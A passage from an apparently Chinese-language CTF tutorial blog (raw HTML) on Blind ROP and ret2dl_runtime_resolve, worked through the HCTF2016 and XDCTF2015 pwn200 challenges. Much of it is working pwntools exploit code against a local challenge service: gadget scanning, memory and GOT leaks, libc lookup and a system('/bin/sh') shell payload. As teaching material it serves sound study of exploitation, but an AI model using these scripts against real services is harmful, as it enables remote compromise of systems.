非法地址，不可访问，比如说0x0。</li>\n</ul>\n<p>那么我们如果控制传递的参数为这两种地址的组合，会出现以下四种情况</p>\n<ul>\n<li>strcmp(bad,bad)</li>\n<li>strcmp(bad,readable)</li>\n<li>strcmp(readable,bad)</li>\n<li>strcmp(readable,readable)</li>\n</ul>\n<p>只有最后一种格式，程序才会正常执行。</p>\n<p><strong>注</strong>：在没有PIE保护的时候，64位程序的ELF文件的0x400000处有7个非零字节。</p>\n<p>那么我们该如何具体地去做呢？有一种比较直接的方法就是从头到尾依次扫描每个plt表项，但是这个却比较麻烦。我们可以选择如下的一种方法</p>\n<ul>\n<li>利用plt表项的慢路径</li>\n<li>并且利用下一个表项的慢路径的地址来覆盖返回地址</li>\n</ul>\n<p>这样，我们就不用来回控制相应的变量了。</p>\n<p>当然，我们也可能碰巧找到strncmp或者strcasecmp函数，它们具有和strcmp一样的效果。</p>\n<p><strong>寻找输出函数</strong></p>\n<p>寻找输出函数既可以寻找write，也可以寻找puts。一般现先找puts函数。不过这里为了介绍方便，先介绍如何寻找write。</p>\n<p><strong>寻找write@plt</strong></p>\n<p>当我们可以控制write函数的三个参数的时候，我们就可以再次遍历所有的plt表，根据write函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值</p>\n<ul>\n<li>使用rop     chain，同时使得每个rop对应的文件描述符不一样</li>\n<li>同时打开多个连接，并且我们使用相对较高的数值来试一试。</li>\n</ul>\n<p>需要注意的是</p>\n<ul>\n<li>linux默认情况下，一个进程最多只能打开1024个文件描述符。</li>\n<li>posix标准每次申请的文件描述符数值总是当前最小可用数值。</li>\n</ul>\n<p>当然，我们也可以选择寻找puts函数。</p>\n<p><strong>寻找puts@plt</strong></p>\n<p>寻找puts函数(这里我们寻找的是 plt)，我们自然需要控制rdi参数，在上面，我们已经找到了brop gadget。那么，我们根据brop gadget偏移9可以得到相应的gadgets（由ret2libc_csu_init中后续可得）。同时在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\\x7fELF。所以我们可以根据这个来进行判断。一般来说，其payload如下</p>\n<p>payload = ‘A’*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)</p>\n<p>此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出.text段更多的内容以便于来找到更多合适gadgets。同时，攻击者还可以找到一些其它函数，如dup2或者execve函数。一般来说，攻击者此时会去做下事情</p>\n<ul>\n<li>将socket输出重定向到输入输出</li>\n<li>寻找“/bin/sh”的地址。一般来说，最好是找到一块可写的内存，利用write函数将这个字符串写到相应的地址。</li>\n<li>执行execve获取shell，获取execve不一定在plt表中，此时攻击者就需要想办法执行系统调用了。</li>\n</ul>\n<p>以HCTF2016的出题人失踪了为例</p>\n<p>1.确定栈溢出长度。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getbufferflow_length</span>():</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">            sh.recvuntil(<span class=\"string\">&#x27;WelCome my friend,Do you know password?\\n&#x27;</span>)</span><br><span class=\"line\">            sh.send(i * <span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">            output = sh.recv()</span><br><span class=\"line\">            sh.close()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> output.startswith(<span class=\"string\">&#x27;No password&#x27;</span>):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> i - <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                i += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> EOFError:</span><br><span class=\"line\">            sh.close()</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i - <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>根据上面，我们可以确定，栈溢出的长度为72。同时，根据回显信息可以发现程序并没有开启canary保护，否则，就会有相应的报错内容。所以我们不需要执行stack reading。</p>\n<p>2.寻找 stop gadgets。</p>\n<p>寻找过程如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_stop_addr</span>(<span class=\"params\">length</span>):</span></span><br><span class=\"line\">    addr = <span class=\"number\">0x400000</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">            sh.recvuntil(<span class=\"string\">&#x27;password?\\n&#x27;</span>)</span><br><span class=\"line\">            payload = <span class=\"string\">&#x27;a&#x27;</span> * length + p64(addr)</span><br><span class=\"line\">            sh.sendline(payload)</span><br><span class=\"line\">            sh.recv()</span><br><span class=\"line\">            sh.close()</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&#x27;one success addr: 0x%x&#x27;</span> % (addr)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> addr</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            addr += <span class=\"number\">1</span></span><br><span class=\"line\">            sh.close()</span><br></pre></td></tr></table></figure>\n\n<p>这里我们直接尝试64位程序没有开启PIE的情况，因为一般是这个样子的，如果开启了，那就按照开启了的方法做，结果发现了不少，我选择了一个貌似返回到源程序中的地址</p>\n<p>one success stop gadget addr: 0x4006b6</p>\n<p>3.识别brop gadgets。</p>\n<p>下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_brop_gadget</span>(<span class=\"params\">length, stop_gadget, addr</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">        sh.recvuntil(<span class=\"string\">&#x27;password?\\n&#x27;</span>)</span><br><span class=\"line\">        payload = <span class=\"string\">&#x27;a&#x27;</span> * length + p64(addr) + p64(<span class=\"number\">0</span>) * <span class=\"number\">6</span> + p64(</span><br><span class=\"line\">            stop_gadget) + p64(<span class=\"number\">0</span>) * <span class=\"number\">10</span></span><br><span class=\"line\">        sh.sendline(payload)</span><br><span class=\"line\">        content = sh.recv()</span><br><span class=\"line\">        sh.close()</span><br><span class=\"line\">        <span class=\"built_in\">print</span> content</span><br><span class=\"line\">        <span class=\"comment\"># stop gadget returns memory</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> content.startswith(<span class=\"string\">&#x27;WelCome&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        sh.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">check_brop_gadget</span>(<span class=\"params\">length, addr</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">        sh.recvuntil(<span class=\"string\">&#x27;password?\\n&#x27;</span>)</span><br><span class=\"line\">        payload = <span class=\"string\">&#x27;a&#x27;</span> * length + p64(addr) + <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">8</span> * <span class=\"number\">10</span></span><br><span class=\"line\">        sh.sendline(payload)</span><br><span class=\"line\">        content = sh.recv()</span><br><span class=\"line\">        sh.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        sh.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">##length = getbufferflow_length()</span></span><br><span class=\"line\">length = <span class=\"number\">72</span></span><br><span class=\"line\"><span class=\"comment\">##get_stop_addr(length)</span></span><br><span class=\"line\">stop_gadget = <span class=\"number\">0x4006b6</span></span><br><span class=\"line\">addr = <span class=\"number\">0x400740</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(addr)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&#x27;possible brop gadget: 0x%x&#x27;</span> % addr</span><br><span class=\"line\">        <span class=\"keyword\">if</span> check_brop_gadget(length, addr):</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&#x27;success brop gadget: 0x%x&#x27;</span> % addr</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    addr += <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>这样，我们基本得到了brop的gadgets地址0x4007ba</p>\n<p>4.确定puts@plt地址。</p>\n<p>根据上面所说，我们可以构造如下payload来进行获取：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">72</span> +p64(pop_rdi_ret)+p64(<span class=\"number\">0x400000</span>)+p64(addr)+p64(stop_gadget)</span><br></pre></td></tr></table></figure>\n\n<p>具体函数如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_puts_addr</span>(<span class=\"params\">length, rdi_ret, stop_gadget</span>):</span></span><br><span class=\"line\">    addr = <span class=\"number\">0x400000</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(addr)</span><br><span class=\"line\">        sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">        sh.recvuntil(<span class=\"string\">&#x27;password?\\n&#x27;</span>)</span><br><span class=\"line\">        payload = <span class=\"string\">&#x27;A&#x27;</span> * length + p64(rdi_ret) + p64(<span class=\"number\">0x400000</span>) + p64(</span><br><span class=\"line\">            addr) + p64(stop_gadget)</span><br><span class=\"line\">        sh.sendline(payload)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            content = sh.recv()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> content.startswith(<span class=\"string\">&#x27;\\x7fELF&#x27;</span>):</span><br><span class=\"line\">                <span class=\"built_in\">print</span> <span class=\"string\">&#x27;find puts@plt addr: 0x%x&#x27;</span> % addr</span><br><span class=\"line\">                <span class=\"keyword\">return</span> addr</span><br><span class=\"line\">            sh.close()</span><br><span class=\"line\">            addr += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            sh.close()</span><br><span class=\"line\">            addr += <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>最后根据plt的结构，选择0x400560作为puts@plt</p>\n<p>5.泄露puts@got地址。</p>\n<p>在我们可以调用puts函数后，我们可以泄露puts函数的地址，进而获取libc版本，从而获取相关的system函数地址与/bin/sh地址，从而获取shell。我们从0x400000开始泄露0x1000个字节，这已经足够包含程序的plt部分了。代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span>(<span class=\"params\">length, rdi_ret, puts_plt, leak_addr, stop_gadget</span>):</span></span><br><span class=\"line\">    sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">    payload = <span class=\"string\">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class=\"line\">        puts_plt) + p64(stop_gadget)</span><br><span class=\"line\">    sh.recvuntil(<span class=\"string\">&#x27;password?\\n&#x27;</span>)</span><br><span class=\"line\">    sh.sendline(payload)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        data = sh.recv()</span><br><span class=\"line\">        sh.close()</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            data = data[:data.index(<span class=\"string\">&quot;\\nWelCome&quot;</span>)]</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            data = data</span><br><span class=\"line\">        <span class=\"keyword\">if</span> data == <span class=\"string\">&quot;&quot;</span>:</span><br><span class=\"line\">            data = <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> data</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        sh.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"comment\">##length = getbufferflow_length()</span></span><br><span class=\"line\">length = <span class=\"number\">72</span></span><br><span class=\"line\"><span class=\"comment\">##stop_gadget = get_stop_addr(length)</span></span><br><span class=\"line\">stop_gadget = <span class=\"number\">0x4006b6</span></span><br><span class=\"line\"><span class=\"comment\">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class=\"line\">brop_gadget = <span class=\"number\">0x4007ba</span></span><br><span class=\"line\">rdi_ret = brop_gadget + <span class=\"number\">9</span></span><br><span class=\"line\"><span class=\"comment\">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span></span><br><span class=\"line\">puts_plt = <span class=\"number\">0x400560</span></span><br><span class=\"line\">addr = <span class=\"number\">0x400000</span></span><br><span class=\"line\">result = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> addr &lt; <span class=\"number\">0x401000</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(addr)</span><br><span class=\"line\">    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> data <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        result += data</span><br><span class=\"line\">    addr += <span class=\"built_in\">len</span>(data)</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;code&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    f.write(result)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>6.最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是“”,那说明我们遇到了’\\x00’，因为puts是输出字符串，字符串是以’\\x00’为终止符的。之后利用ida打开binary模式，首先在edit-&gt;segments-&gt;rebase program 将程序的基地址改为0x400000，然后找到偏移0x560处，如下:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">seg000:0000000000400560                 db 0FFh</span><br><span class=\"line\">seg000:0000000000400561                 db  25h ; %</span><br><span class=\"line\">seg000:0000000000400562                 db 0B2h ;</span><br><span class=\"line\">seg000:0000000000400563                 db  0Ah</span><br><span class=\"line\">seg000:0000000000400564                 db  20h</span><br><span class=\"line\">seg000:0000000000400565                 db    0</span><br><span class=\"line\">#然后按下c,将此处的数据转换为汇编指令，如下</span><br><span class=\"line\">seg000:0000000000400560 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">seg000:0000000000400560                 jmp     qword ptr cs:601018h</span><br><span class=\"line\">seg000:0000000000400566 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">seg000:0000000000400566                 push    0</span><br><span class=\"line\">seg000:000000000040056B                 jmp     loc_400550</span><br><span class=\"line\">seg000:000000000040056B ; ---------------------------------------------------------------------------</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这说明，puts@got的地址为0x601018。</p>\n<p>7.程序利用</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##length = getbufferflow_length()</span></span><br><span class=\"line\">length = <span class=\"number\">72</span></span><br><span class=\"line\"><span class=\"comment\">##stop_gadget = get_stop_addr(length)</span></span><br><span class=\"line\">stop_gadget = <span class=\"number\">0x4006b6</span></span><br><span class=\"line\"><span class=\"comment\">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class=\"line\">brop_gadget = <span class=\"number\">0x4007ba</span></span><br><span class=\"line\">rdi_ret = brop_gadget + <span class=\"number\">9</span></span><br><span class=\"line\"><span class=\"comment\">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class=\"line\">puts_plt = <span class=\"number\">0x400560</span></span><br><span class=\"line\"><span class=\"comment\">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class=\"line\">puts_got = <span class=\"number\">0x601018</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">9999</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&#x27;password?\\n&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">data = sh.recvuntil(<span class=\"string\">&#x27;\\nWelCome&#x27;</span>, drop=<span class=\"literal\">True</span>)</span><br><span class=\"line\">puts_addr = u64(data.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class=\"line\">libc_base = puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">system_addr = libc_base + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">binsh_addr = libc_base + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"高级了！！！不敢想象wow-⊙o⊙！！！\"><a href=\"#高级了！！！不敢想象wow-⊙o⊙！！！\" class=\"headerlink\" title=\"高级了！！！不敢想象wow~ ⊙o⊙！！！\"></a>高级了！！！不敢想象wow~ ⊙o⊙！！！</h3><p><strong>ret2_dl_runtime_resolve</strong></p>\n<p>高级ROP其实和一般的ROP基本一样，其主要的区别在于它利用了一些更加底层的原理。</p>\n<p>要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程，请参考executable中elf对应的介绍。这里我只给出相应的利用方式。</p>\n<p>我们知道在linux中是利用_dl_runtime_resolve(link_map_obj, reloc_index)来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案还肯定的。具体利用方式如下</p>\n<ol>\n<li><p>控制程序执行dl_resolve函数</p>\n</li>\n<li><ul>\n<li>给定Link_map以及index两个参数。</li>\n<li>当然我们可以直接给定 plt0对应的汇编代码，这时，我们就只需要一个index就足够了。</li>\n</ul>\n</li>\n<li><p>控制index的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。</p>\n</li>\n<li><p>伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。</p>\n</li>\n<li><p>伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</p>\n</li>\n</ol>\n<p><strong>此外，这个攻击成功的很必要的条件</strong></p>\n<ul>\n<li><strong>dl_resolve函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。</strong></li>\n<li><strong>dl_resolve函数最后的解析根本上依赖于所给定的字符串。</strong></li>\n</ul>\n<p><strong>注意</strong>：</p>\n<ul>\n<li><p>符号版本信息</p>\n</li>\n<li><ul>\n<li>最好使得ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为0，以便于防止找不到的情况。</li>\n</ul>\n</li>\n<li><p>重定位表项</p>\n</li>\n<li><ul>\n<li>r_offset必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</li>\n</ul>\n</li>\n</ul>\n<p><strong>攻击条件</strong></p>\n<p>说了这么多，这个利用技巧其实还是ROP，同样可以绕过NX和ASLR保护。但是，这个攻击更适于一些比较简单的栈溢出的情况，但同时又难以泄露获取更多信息的情况下。</p>\n<p><strong>以XDCTF 2015的pwn200为例</strong></p>\n<p>首先我们可以编译下ret2dlresolve文件夹下的源文件main.c文件得到二进制文件，这里取消了Canary保护。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2dlresolve git:(master) ✗ gcc main.c -m32 -fno-stack-protector -o main</span><br></pre></td></tr></table></figure>\n\n<p>在下面的讲解过程中，我会按照以两种不同的方法来进行讲解。其中第一种方法比较麻烦，但是可以仔细理解ret2dlresolve的原理，第二种方法则是直接使用已有的工具，相对容易一点。</p>\n<pre><code>1. 利用正常的代码来使用该技巧从而获取shell。\n \\-  stage 1 测试控制程序执行write函数的效果。\n \\-  stage 2 测试控制程序执行dl_resolve函数，并且相应参数指向正常write函数的plt时的执行效果。\n \\-  stage 3 测试控制程序执行dl_resolve函数，并且相应参数指向伪造的write函数的plt时的执行效果。\n</code></pre>\n<ol start=\"2\">\n<li>利用roputils中已经集成好的工具来实现攻击，从而获取shell。</li>\n</ol>\n<p><strong>正常攻击</strong></p>\n<p>显然我们程序有一个很明显的栈溢出漏洞的。这题我们不考虑我们有libc的情况。我们可以很容易的分析出偏移为112。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  pattern create 200</span><br><span class=\"line\">[+] Generating a pattern of 200 bytes</span><br><span 